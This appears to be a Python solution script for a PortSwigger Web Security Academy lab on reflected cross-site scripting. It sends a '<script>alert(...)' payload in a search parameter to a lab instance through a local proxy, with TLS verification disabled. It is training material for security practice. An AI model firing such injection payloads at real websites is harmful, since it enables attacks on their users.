# https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded

import requests
requests.packages.urllib3.disable_warnings()

url = "https://ac341f2a1f47d6fe804110d8001e0025.web-security-academy.net"
proxy = "127.0.0.1:8080"
proxies = {"https://": proxy, "http://": proxy}
verify = False
cookies = {"session": "uvVXwzl6jnRVGOtf4CFlS1H517olVH63"}
params = {"search": "<script>alert('hi');</script>"}

requests.get(url, params=params, verify=verify, proxies=proxies)
